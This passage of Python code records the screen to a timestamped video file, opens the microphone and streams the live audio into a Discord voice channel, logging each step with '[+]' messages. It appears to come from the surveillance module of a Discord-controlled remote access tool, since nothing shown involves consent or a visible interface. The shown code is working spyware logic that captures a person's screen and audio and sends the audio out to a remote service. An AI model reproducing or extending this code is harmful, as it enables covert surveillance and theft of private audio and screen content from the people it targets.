        f.write("[+] Starting screen recording and live audio streaming\n")
    try:
        # Initialize video writer for screen recording
        output_path = resource_path(f'recordings/screen_record_{datetime.now().strftime("%Y%m%d_%H%M%S")}.avi')
        screen_size = (mss.mss().monitors[1]["width"], mss.mss().monitors[1]["height"])
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(output_path, fourcc, 10.0, screen_size)
        
        # Initialize audio for streaming
        CHUNK = 2048
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 48000  # High-quality audio
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        # Join voice channel
        voice_client = await voice_channel.connect()
        with open(log_path, "a") as f:
            f.write(f"[+] Connected to voice channel {voice_channel.name}\n")
        audio_source = CustomAudioSource(stream, frame_rate=RATE, channels=CHANNELS, chunk=CHUNK)
        voice_client.play(audio_source)
        
        # Record screen for 30 seconds
        sct = mss.mss()
        start_time = time.time()
        duration = 30  # seconds
        while time.time() - start_time < duration:
